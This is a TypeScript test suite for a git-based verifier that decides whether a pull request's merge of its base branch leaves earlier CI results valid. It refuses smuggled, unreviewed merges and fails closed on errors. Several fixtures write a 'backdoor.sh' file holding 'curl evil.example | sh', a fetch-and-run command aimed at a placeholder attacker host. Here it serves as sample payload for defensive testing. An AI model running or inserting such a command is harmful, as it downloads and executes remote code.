import { describe, it, expect, beforeEach, afterEach } from "bun:test";
import { execFileSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync, mkdirSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { parse as parseYaml } from "yaml";

import {
  cleanIntegrateWitness,
  makeGitRunner,
  type GitRunner,
  type GitResult,
} from "../clean-integrate-witness";

// Every case below builds a real repository and asks the real git. A fake
// GitRunner would let these tests agree with a wrong mental model of merge-tree,
// which is the one thing this predicate must not get wrong. The two cases that
// do use a fake runner are the ones about git FAILING, which real git will not
// do on demand.
//
// The fixtures are also sealed off from the machine's git configuration. On a
// developer box `init.templateDir` plants a pre-commit hook into every new
// repo, `core.hooksPath` applies a commit-message policy, and `core.excludesFile`
// could make `git add` of a fixture file fail for a reason no reader would
// guess. Those three affect writes, which only the fixture performs — but
// `merge.*` and `diff.renames` also change how the PREDICATE recomputes a merge,
// so both sides take the same env or the two halves of a test disagree for a
// reason no reader would guess.
//
// It has to be passed explicitly rather than assigned to process.env: bun's
// execFileSync does not propagate runtime process.env mutations to children, so
// the assignment form looks right, runs green, and isolates nothing.
const ISOLATED_GIT_ENV = {
  ...process.env,
  GIT_CONFIG_GLOBAL: "/dev/null",
  GIT_CONFIG_SYSTEM: "/dev/null",
};

const BASE_REF = "base";

let repo: string;
let git: GitRunner;

function run(...args: string[]): string {
  return execFileSync("git", args, {
    cwd: repo,
    encoding: "utf8",
    env: ISOLATED_GIT_ENV,
  }).trim();
}

function commit(file: string, contents: string, message: string): string {
  const full = join(repo, file);
  mkdirSync(join(full, ".."), { recursive: true });
  writeFileSync(full, contents);
  run("add", "--", file);
  run("commit", "-m", message);
  return run("rev-parse", "HEAD");
}

/** Builds the shape this whole change exists for, and returns its three SHAs. */
function buildCleanIntegrate(): { root: string; runHead: string; prHead: string } {
  const root = run("rev-parse", "HEAD");
  const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");

  run("checkout", "-q", "-b", BASE_REF, root);
  commit("unrelated.txt", "base moved\n", "chore: a sibling PR lands");

  run("checkout", "-q", "feature");
  run("merge", "-q", "--no-ff", "-m", "Merge base into feature", BASE_REF);
  return { root, runHead, prHead: run("rev-parse", "HEAD") };
}

function witness(runHead: string, prHead: string, baseRef = BASE_REF) {
  return cleanIntegrateWitness(git, { runHead, prHead, baseRef });
}

beforeEach(() => {
  repo = mkdtempSync(join(tmpdir(), "witness-"));
  git = makeGitRunner(repo, ISOLATED_GIT_ENV);
  run("init", "-q", "-b", "feature");
  run("config", "user.email", "t@example.test");
  run("config", "user.name", "Test");
  run("commit", "--allow-empty", "-q", "-m", "root");
});

afterEach(() => {
  rmSync(repo, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// The case the change exists for
// ---------------------------------------------------------------------------

describe("cleanIntegrateWitness — accepts", () => {
  it("a head that is the run's commit plus a clean base merge", () => {
    const { runHead, prHead } = buildCleanIntegrate();
    expect(prHead).not.toBe(runHead);
    expect(witness(runHead, prHead)).toEqual({ accepted: true, reason: "accepted" });
  });

  it("after two successive base integrations", () => {
    const root = run("rev-parse", "HEAD");
    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");

    run("checkout", "-q", "-b", BASE_REF, root);
    commit("one.txt", "1\n", "chore: first sibling");
    run("checkout", "-q", "feature");
    run("merge", "-q", "--no-ff", "-m", "Merge base (1)", BASE_REF);

    run("checkout", "-q", BASE_REF);
    commit("two.txt", "2\n", "chore: second sibling");
    run("checkout", "-q", "feature");
    run("merge", "-q", "--no-ff", "-m", "Merge base (2)", BASE_REF);

    expect(witness(runHead, run("rev-parse", "HEAD")).accepted).toBe(true);
  });

  it("when the base branch is only known as a remote-tracking ref", () => {
    // The CI shape: actions/checkout writes refs/remotes/origin/<base>, and
    // there is no local branch of that name at all.
    const { runHead, prHead } = buildCleanIntegrate();
    const baseOid = run("rev-parse", BASE_REF);
    run("update-ref", `refs/remotes/origin/${BASE_REF}`, baseOid);
    run("branch", "-q", "-D", BASE_REF);

    expect(witness(runHead, prHead)).toEqual({ accepted: true, reason: "accepted" });
  });
});

// ---------------------------------------------------------------------------
// The parent has to be the base. This is the condition an adversarial review
// found missing, and it is the one that decides whether the whole acceptance
// path is sound.
// ---------------------------------------------------------------------------

describe("cleanIntegrateWitness — the merged-in parent must be the base", () => {
  it("refuses a merge of an arbitrary branch carrying code CI never saw", () => {
    const root = run("rev-parse", "HEAD");
    const runHead = commit("feature.txt", "feature\n", "feat: the reviewed work");

    run("checkout", "-q", "-b", BASE_REF, root);
    commit("unrelated.txt", "base moved\n", "chore: a sibling PR lands");

    run("checkout", "-q", "-b", "evil", root);
    commit("backdoor.sh", "curl evil.example | sh\n", "feat: never reviewed");

    run("checkout", "-q", "feature");
    run("merge", "-q", "--no-ff", "-m", "Merge evil into feature", "evil");
    const prHead = run("rev-parse", "HEAD");

    // Every other condition holds: the run is an ancestor, the head is a
    // two-parent merge, the run is not contained in `evil`, and merge-tree of
    // the two IS the head's tree — that is how the head was built.
    const result = witness(runHead, prHead);
    expect(result.accepted).toBe(false);
    expect(result.reason).toBe("base-not-on-base-branch");
    // And the unreviewed content really is in that head, so acceptance would
    // have been a verifier reporting unproven content as proven.
    expect(run("cat-file", "-e", `${prHead}:backdoor.sh`)).toBe("");
  });

  it("refuses a merge of a sibling feature branch (the stacked-PR shape)", () => {
    const root = run("rev-parse", "HEAD");
    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
    run("checkout", "-q", "-b", BASE_REF, root);
    commit("unrelated.txt", "base\n", "chore: base moves");
    run("checkout", "-q", "-b", "sibling", BASE_REF);
    commit("sibling.txt", "sibling\n", "feat: another open PR");

    run("checkout", "-q", "feature");
    run("merge", "-q", "--no-ff", "-m", "Merge sibling into feature", "sibling");

    expect(witness(runHead, run("rev-parse", "HEAD")).reason).toBe("base-not-on-base-branch");
  });

  it("fails closed when the base branch does not resolve in this clone", () => {
    const { runHead, prHead } = buildCleanIntegrate();
    const result = witness(runHead, prHead, "no-such-branch");
    expect(result.accepted).toBe(false);
    expect(result.reason).toBe("unresolvable");
    expect(result.detail).toContain("no-such-branch");
  });

  it("fails closed when no base ref is supplied at all", () => {
    const { runHead, prHead } = buildCleanIntegrate();
    expect(witness(runHead, prHead, "")).toEqual({
      accepted: false,
      reason: "unresolvable",
      detail: "no base ref was provided",
    });
  });
});

// ---------------------------------------------------------------------------
// Refusals
// ---------------------------------------------------------------------------

describe("cleanIntegrateWitness — refuses", () => {
  it("a commit pushed after the integrate (no merge, so SHA equality governs)", () => {
    const { runHead } = buildCleanIntegrate();
    const prHead = commit("feature.txt", "feature, fixed\n", "fix: apply review finding");

    const result = witness(runHead, prHead);
    expect(result.accepted).toBe(false);
    expect(result.reason).toBe("head-not-a-merge");
  });

  it("content drift carried inside the merge itself", () => {
    const root = run("rev-parse", "HEAD");
    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
    commit("feature.txt", "feature, fixed\n", "fix: apply review finding");

    run("checkout", "-q", "-b", BASE_REF, root);
    commit("unrelated.txt", "base moved\n", "chore: sibling lands");

    run("checkout", "-q", "feature");
    run("merge", "-q", "--no-ff", "-m", "Merge base into feature", BASE_REF);

    expect(witness(runHead, run("rev-parse", "HEAD")).reason).toBe("drift");
  });

  it("an evil merge that injects content into the merge commit", () => {
    const root = run("rev-parse", "HEAD");
    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
    run("checkout", "-q", "-b", BASE_REF, root);
    commit("unrelated.txt", "base\n", "chore: sibling lands");

    run("checkout", "-q", "feature");
    run("merge", "--no-commit", "--no-ff", BASE_REF);
    writeFileSync(join(repo, "smuggled.txt"), "content no run ever saw\n");
    run("add", "--", "smuggled.txt");
    run("commit", "-q", "-m", "Merge base into feature");

    expect(witness(runHead, run("rev-parse", "HEAD")).reason).toBe("drift");
  });

  it("a merge that discards the base with -s ours", () => {
    const root = run("rev-parse", "HEAD");
    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
    run("checkout", "-q", "-b", BASE_REF, root);
    commit("unrelated.txt", "base\n", "chore: sibling lands");

    run("checkout", "-q", "feature");
    run("merge", "-q", "--no-ff", "-s", "ours", "-m", "Merge base into feature", BASE_REF);

    expect(witness(runHead, run("rev-parse", "HEAD")).reason).toBe("drift");
  });

  it("an octopus merge", () => {
    // Pins the "two parents exactly" rule. A three-parent head is not an
    // integrate, and taking one of its parents as "the base" would be a guess.
    const root = run("rev-parse", "HEAD");
    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
    run("checkout", "-q", "-b", BASE_REF, root);
    commit("b1.txt", "1\n", "chore: base one");
    run("checkout", "-q", "-b", "base2", root);
    commit("b2.txt", "2\n", "chore: base two");

    run("checkout", "-q", "feature");
    run("merge", "-q", "--no-ff", "-m", "Octopus", BASE_REF, "base2");

    expect(witness(runHead, run("rev-parse", "HEAD")).reason).toBe("head-not-a-merge");
  });

  it("a hand-resolved conflict", () => {
    const root = run("rev-parse", "HEAD");
    const runHead = commit("shared.txt", "ours\n", "feat: the work CI ran on");

    run("checkout", "-q", "-b", BASE_REF, root);
    commit("shared.txt", "theirs\n", "chore: a conflicting sibling lands");

    run("checkout", "-q", "feature");
    try {
      run("merge", "--no-ff", "-m", "Merge base into feature", BASE_REF);
    } catch {
      writeFileSync(join(repo, "shared.txt"), "hand resolved\n");
      run("add", "--", "shared.txt");
      run("commit", "-q", "--no-edit");
    }

    expect(witness(runHead, run("rev-parse", "HEAD")).reason).toBe("conflicts");
  });

  it("a run whose commit is not an ancestor of the head", () => {
    const root = run("rev-parse", "HEAD");
    run("checkout", "-q", "-b", "other", root);
    const runHead = commit("elsewhere.txt", "elsewhere\n", "feat: an unrelated branch");

    run("checkout", "-q", "feature");
    commit("feature.txt", "feature\n", "feat: the real work");
    run("checkout", "-q", "-b", BASE_REF, root);
    commit("unrelated.txt", "base\n", "chore: sibling lands");
    run("checkout", "-q", "feature");
    run("merge", "-q", "--no-ff", "-m", "Merge base into feature", BASE_REF);

    expect(witness(runHead, run("rev-parse", "HEAD")).reason).toBe("not-ancestor");
  });

  it("the vacuous case where the base already contains the run's commit", () => {
    const runHead = commit("shared.txt", "v1\n", "chore: landed before the branch existed");
    run("checkout", "-q", "-b", BASE_REF);
    commit("more.txt", "base\n", "chore: base moves on");

    run("checkout", "-q", "-B", "feature", runHead);
    run("merge", "-q", "--no-ff", "-m", "Merge base into feature", BASE_REF);

    expect(witness(runHead, run("rev-parse", "HEAD")).reason).toBe("vacuous");
  });

  it("a merge recorded with its parents the other way round", () => {
    const root = run("rev-parse", "HEAD");
    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
    run("checkout", "-q", "-b", BASE_REF, root);
    commit("unrelated.txt", "base\n", "chore: sibling lands");
    // Merging FROM the base side records [base, feature].
    run("merge", "-q", "--no-ff", "-m", "Merge feature into base", "feature");

    expect(witness(runHead, run("rev-parse", "HEAD")).accepted).toBe(false);
  });

  it("a rebase, which rewrites the run's commit out of the history", () => {
    const root = run("rev-parse", "HEAD");
    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
    run("checkout", "-q", "-b", BASE_REF, root);
    commit("unrelated.txt", "base\n", "chore: sibling lands");
    run("checkout", "-q", "feature");
    run("rebase", "-q", BASE_REF);

    expect(witness(runHead, run("rev-parse", "HEAD")).accepted).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Fail-closed contract. A verifier that cannot answer must say no.
// ---------------------------------------------------------------------------

describe("cleanIntegrateWitness — fails closed", () => {
  it("on a shallow clone, which is what a depth-1 checkout produces", () => {
    const { runHead, prHead } = buildCleanIntegrate();
    const shallow = mkdtempSync(join(tmpdir(), "witness-shallow-"));
    try {
      execFileSync("git", ["clone", "-q", "--depth", "1", "--no-local", `file://${repo}`, shallow], {
        encoding: "utf8",
        env: ISOLATED_GIT_ENV,
      });
      const result = cleanIntegrateWitness(makeGitRunner(shallow, ISOLATED_GIT_ENV), {
        runHead,
        prHead,
        baseRef: BASE_REF,
      });
      expect(result.accepted).toBe(false);
    } finally {
      rmSync(shallow, { recursive: true, force: true });
    }
  });

  it("on a SHA that is not a full object id", () => {
    const { prHead } = buildCleanIntegrate();
    expect(witness("HEAD", prHead)).toEqual({ accepted: false, reason: "bad-sha" });
    expect(witness("abc123", prHead)).toEqual({ accepted: false, reason: "bad-sha" });
  });

  it("when git cannot be run at all", () => {
    const dead: GitRunner = () => ({ ok: false, code: null, stdout: "", stderr: "no git" });
    expect(
      cleanIntegrateWitness(dead, { runHead: "a".repeat(40), prHead: "b".repeat(40), baseRef: "main" })
        .reason
    ).toBe("unresolvable");
  });

  it("when the vacuous guard errors rather than answering", () => {
    // The guard's answer is "is the run already in the base". An error there
    // must not read as "no" — that is the fail-open this shape is prone to.
    const { runHead, prHead } = buildCleanIntegrate();
    const real = makeGitRunner(repo, ISOLATED_GIT_ENV);
    const baseOid = run("rev-parse", BASE_REF);
    const failing: GitRunner = (args) => {
      if (args[0] === "merge-base" && args[2] === runHead && args[3] === baseOid) {
        return { ok: false, code: 128, stdout: "", stderr: "fatal: bad object" };
      }
      return real(args);
    };
    expect(cleanIntegrateWitness(failing, { runHead, prHead, baseRef: BASE_REF }).reason).toBe(
      "unresolvable"
    );
  });

  it("when the parent list cannot be read", () => {
    const { runHead, prHead } = buildCleanIntegrate();
    const real = makeGitRunner(repo, ISOLATED_GIT_ENV);
    const failing: GitRunner = (args) =>
      args[0] === "rev-list"
        ? { ok: false, code: 128, stdout: "", stderr: "fatal: bad object" }
        : real(args);
    expect(cleanIntegrateWitness(failing, { runHead, prHead, baseRef: BASE_REF }).reason).toBe(
      "unresolvable"
    );
  });

  it("when the head tree cannot be read", () => {
    const { runHead, prHead } = buildCleanIntegrate();
    const real = makeGitRunner(repo, ISOLATED_GIT_ENV);
    const failing: GitRunner = (args) =>
      args[0] === "rev-parse" && args[1]?.endsWith("^{tree}")
        ? { ok: false, code: 128, stdout: "", stderr: "fatal: bad object" }
        : real(args);
    expect(cleanIntegrateWitness(failing, { runHead, prHead, baseRef: BASE_REF }).reason).toBe(
      "unresolvable"
    );
  });

  it("distinguishes an unusable merge-tree from a real conflict", () => {
    // git < 2.38 has no `--write-tree`, and unrelated histories exit 128.
    // Reporting either as "your merge conflicts" sends the author after a
    // problem they do not have.
    const { runHead, prHead } = buildCleanIntegrate();
    const real = makeGitRunner(repo, ISOLATED_GIT_ENV);
    const failing: GitRunner = (args) =>
      args[0] === "merge-tree"
        ? { ok: false, code: 129, stdout: "", stderr: "error: unknown option `write-tree'" }
        : real(args);
    const result = cleanIntegrateWitness(failing, { runHead, prHead, baseRef: BASE_REF });
    expect(result.reason).toBe("merge-tree-unavailable");
    expect(result.detail).toContain("write-tree");
  });
});

// ---------------------------------------------------------------------------
// The workflow setting the predicate depends on.
//
// Removing `fetch-depth: 0` does not break anything visibly: the witness just
// reports `unresolvable` and every integrated branch reads as stale again,
// which is indistinguishable from correct operation to anyone who does not know
// the feature exists. That silence is why this is asserted here.
// ---------------------------------------------------------------------------

describe("verify-claims.yml", () => {
  const workflow = parseYaml(
    readFileSync(join(import.meta.dir, "../../.github/workflows/verify-claims.yml"), "utf8")
  );
  const steps = workflow.jobs.verify.steps as Array<Record<string, any>>;

  it("checks the PR head out with full history when the body cites a CI run", () => {
    const checkout = steps.find(
      (s) => String(s.uses ?? "").startsWith("actions/checkout") && s.with?.ref?.includes("head.sha")
    );
    expect(checkout).toBeDefined();
    const depth = String(checkout!.with["fetch-depth"]);
    expect(depth).toContain("cites_ci_run");
    // Quoted, because GitHub expressions treat the number 0 as falsy: the
    // unquoted `&& 0 || 1` form silently always yields 1, which would make the
    // checkout shallow in exactly the case that needs the history and turn the
    // whole feature off while looking correct.
    expect(depth).toContain("'0'");
    expect(depth).toContain("'1'");
  });

  it("decides that depth before the checkout runs", () => {
    const names = steps.map((s) => s.name ?? s.uses);
    expect(names.indexOf("Fetch PR body")).toBeLessThan(names.indexOf("Checkout PR head"));
  });

  it("passes the PR's base ref to the verifier", () => {
    const validate = steps.find((s) => s.name === "Validate proof block");
    expect(validate!.env.PR_BASE_REF).toContain("pull_request.base.ref");
  });
});

// ---------------------------------------------------------------------------
// The anchor is history, not reachability.
//
// A base branch built by merging pull requests REACHES every commit of every
// merged branch, including work-in-progress states it was never at. Anchoring on
// reachability therefore let an author integrate a previously-merged side branch
// and have this report "proven" for content the base never carried. The anchor
// asks a narrower question: was this parent ever a state of the base branch?
// ---------------------------------------------------------------------------

describe("cleanIntegrateWitness — the anchor is the base branch's own history", () => {
  it("refuses a merge of a side branch the base only REACHES", () => {
    const root = run("rev-parse", "HEAD");

    // A side branch with a payload, merged into the base. The payload commit is
    // reachable from the base for ever after, but the base was never at it: the
    // merge dropped it again.
    run("checkout", "-q", "-b", "old-pr", root);
    const payload = commit("backdoor.sh", "curl evil.example | sh\n", "wip: debug hook");
    run("rm", "-q", "backdoor.sh");
    run("commit", "-q", "-m", "chore: drop the debug hook before review");

    run("checkout", "-q", "-b", BASE_REF, root);
    run("merge", "-q", "--no-ff", "-m", "Merge old-pr into base", "old-pr");

    run("checkout", "-q", "feature");
    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
    // Not origin/main — the WIP commit the base merely reaches.
    run("merge", "-q", "--no-ff", "-m", "Merge base into feature", payload);
    const prHead = run("rev-parse", "HEAD");

    // The payload really is in the head, and really is reachable from the base.
    expect(run("cat-file", "-e", `${prHead}:backdoor.sh`)).toBe("");
    expect(
      cleanIntegrateWitness(git, { runHead, prHead, baseRef: BASE_REF }).reason
    ).toBe("base-not-on-base-branch");
  });

  it("still accepts integrating the tip of a base that itself contains merges", () => {
    // The legitimate shape in every real repo: the base branch is built from
    // merge commits, and the author integrates its tip.
    const root = run("rev-parse", "HEAD");
    run("checkout", "-q", "-b", "sibling", root);
    commit("sibling.txt", "sibling\n", "feat: a landed sibling");
    run("checkout", "-q", "-b", BASE_REF, root);
    run("merge", "-q", "--no-ff", "-m", "Merge sibling into base", "sibling");

    run("checkout", "-q", "feature");
    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
    run("merge", "-q", "--no-ff", "-m", "Merge base into feature", BASE_REF);

    expect(
      cleanIntegrateWitness(git, {
        runHead,
        prHead: run("rev-parse", "HEAD"),
        baseRef: BASE_REF,
      }).accepted
    ).toBe(true);
  });

  it("still accepts integrating an older base state while the base moves on", () => {
    // The author integrates today's tip; the base advances before landing. The
    // parent is a PAST state of the base, which is exactly what the chain holds.
    const root = run("rev-parse", "HEAD");
    run("checkout", "-q", "-b", BASE_REF, root);
    commit("one.txt", "1\n", "chore: base state one");

    run("checkout", "-q", "feature");
    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
    run("merge", "-q", "--no-ff", "-m", "Merge base into feature", BASE_REF);
    const prHead = run("rev-parse", "HEAD");

    run("checkout", "-q", BASE_REF);
    commit("two.txt", "2\n", "chore: base state two");

    expect(
      cleanIntegrateWitness(git, { runHead, prHead, baseRef: BASE_REF }).accepted
    ).toBe(true);
  });

  it("refuses when the base ref resolves only as a tag", () => {
    // rev-parse resolves a bare name through refs/tags first, so a tag sharing
    // the base branch's name used to point the anchor wherever the tag pointed.
    // A pull request base is never a tag.
    const root = run("rev-parse", "HEAD");
    run("checkout", "-q", "-b", "evil", root);
    commit("backdoor.sh", "curl evil.example | sh\n", "feat: never reviewed");
    run("tag", "release", "evil");

    run("checkout", "-q", "feature");
    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
    run("merge", "-q", "--no-ff", "-m", "Merge evil into feature", "evil");

    const result = cleanIntegrateWitness(git, {
      runHead,
      prHead: run("rev-parse", "HEAD"),
      baseRef: "release",
    });
    expect(result.accepted).toBe(false);
    expect(result.reason).toBe("unresolvable");
  });

  it("fails closed when the base branch's chain cannot be read", () => {
    const { runHead, prHead } = buildCleanIntegrate();
    const real = makeGitRunner(repo, ISOLATED_GIT_ENV);
    const failing: GitRunner = (args) =>
      args[0] === "rev-list" && args.includes("--first-parent")
        ? { ok: false, code: 128, stdout: "", stderr: "fatal: bad revision" }
        : real(args);
    const result = cleanIntegrateWitness(failing, {
      runHead,
      prHead,
      baseRef: BASE_REF,
    });
    expect(result.reason).toBe("unresolvable");
    // The message must not assert what git declined to determine.
    expect(result.detail).toContain("cannot read the first-parent chain");
  });
});

// ---------------------------------------------------------------------------
// End to end through the real verifier.
//
// The cases above prove the predicate. These prove it is actually wired into
// validateCIRun — a correct predicate that nothing calls would pass every test
// above and change nothing in CI.
// ---------------------------------------------------------------------------

const SCRIPT = `${import.meta.dir}/../verify-proof-block.ts`;

async function verifyBody(
  body: string,
  env: Record<string, string>
): Promise<{ exitCode: number; out: string }> {
  const tmp = join(tmpdir(), `proof-witness-${Date.now()}-${Math.random()}.md`);
  writeFileSync(tmp, body);
  try {
    const proc = Bun.spawn(["bun", "run", SCRIPT, "--body-file", tmp], {
      env: { ...process.env, ...env },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [stdout, stderr] = await Promise.all([
      new Response(proc.stdout).text(),
      new Response(proc.stderr).text(),
    ]);
    return { exitCode: await proc.exited, out: stdout + stderr };
  } finally {
    rmSync(tmp, { force: true });
  }
}

describe("validateCIRun wiring", () => {
  let server: ReturnType<typeof Bun.serve> | undefined;

  afterEach(() => {
    server?.stop(true);
    server = undefined;
  });

  // 127.0.0.1, not the default wildcard: a test has no business listening on
  // every interface of a shared runner.
  function serveRun(headSha: string, conclusion = "success") {
    server = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      fetch: () =>
        new Response(JSON.stringify({ conclusion, head_sha: headSha }), {
          headers: { "content-type": "application/json" },
        }),
    });
    return `http://127.0.0.1:${server.port}`;
  }

  function bodyCiting(runId: string): string {
    return [
      "Some change.",
      "",
      "## Proof",
      "",
      `- [x] tests: https://github.com/florianhorner/demo/actions/runs/${runId} [proof: tests]`,
      "",
    ].join("\n");
  }

  function envFor(prHead: string, api: string): Record<string, string> {
    return {
      GITHUB_TOKEN: "test-token",
      GITHUB_API_URL: api,
      GITHUB_WORKSPACE: repo,
      PR_HEAD_SHA: prHead,
      PR_BASE_REF: BASE_REF,
      PR_HEAD_REPO_FULL_NAME: "florianhorner/demo",
      PR_BASE_REPO_FULL_NAME: "florianhorner/demo",
      OWNED_REPOS: "florianhorner/demo",
    };
  }

  it(
    "accepts a stale-by-SHA run when the head only integrated its base",
    async () => {
      const { runHead, prHead } = buildCleanIntegrate();
      const res = await verifyBody(bodyCiting("123456"), envFor(prHead, serveRun(runHead)));

      expect(res.out).toContain("integrates from base without changing content");
      expect(res.exitCode).toBe(0);
    },
    20_000
  );

  it(
    "still reports a genuinely stale run, and names the reason",
    async () => {
      const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
      const prHead = commit("feature.txt", "changed\n", "fix: a later change");
      const res = await verifyBody(bodyCiting("123456"), envFor(prHead, serveRun(runHead)));

      // The reason is the whole point of the message: "stale" alone sends an
      // author to repoint a URL when the real answer may be "you changed code".
      expect(res.out).toContain("Run is stale (head-not-a-merge)");
      expect(res.exitCode).toBe(1);
    },
    20_000
  );

  it(
    "refuses a merge of a non-base branch end to end",
    async () => {
      const root = run("rev-parse", "HEAD");
      const runHead = commit("feature.txt", "feature\n", "feat: reviewed work");
      run("checkout", "-q", "-b", BASE_REF, root);
      commit("unrelated.txt", "base\n", "chore: sibling lands");
      run("checkout", "-q", "-b", "evil", root);
      commit("backdoor.sh", "curl evil.example | sh\n", "feat: never reviewed");
      run("checkout", "-q", "feature");
      run("merge", "-q", "--no-ff", "-m", "Merge evil into feature", "evil");
      const prHead = run("rev-parse", "HEAD");

      const res = await verifyBody(bodyCiting("123456"), envFor(prHead, serveRun(runHead)));
      expect(res.out).toContain("Run is stale (base-not-on-base-branch)");
      expect(res.exitCode).toBe(1);
    },
    20_000
  );

  it(
    "still fails a run that did not succeed, even when the witness accepts it",
    async () => {
      const { runHead, prHead } = buildCleanIntegrate();
      const res = await verifyBody(
        bodyCiting("123456"),
        envFor(prHead, serveRun(runHead, "failure"))
      );

      expect(res.out).toContain('conclusion is "failure"');
      expect(res.exitCode).toBe(1);
    },
    20_000
  );

  it(
    "leaves the strict verdict standing when the checkout is not the PR head",
    async () => {
      // GITHUB_WORKSPACE pointing somewhere that is not this PR means git would
      // be answering about the wrong repository. It must not answer at all.
      const { runHead, prHead } = buildCleanIntegrate();
      const elsewhere = mkdtempSync(join(tmpdir(), "witness-other-"));
      try {
        execFileSync("git", ["init", "-q", elsewhere], { env: ISOLATED_GIT_ENV });
        execFileSync(
          "git",
          ["-C", elsewhere, "commit", "--allow-empty", "-q", "-m", "unrelated"],
          { env: { ...ISOLATED_GIT_ENV, GIT_AUTHOR_NAME: "T", GIT_AUTHOR_EMAIL: "t@e.test", GIT_COMMITTER_NAME: "T", GIT_COMMITTER_EMAIL: "t@e.test" } }
        );
        const env = envFor(prHead, serveRun(runHead));
        env.GITHUB_WORKSPACE = elsewhere;
        const res = await verifyBody(bodyCiting("123456"), env);

        expect(res.out).toContain("the checkout is not the PR head");
        expect(res.exitCode).toBe(1);
      } finally {
        rmSync(elsewhere, { recursive: true, force: true });
      }
    },
    20_000
  );
});
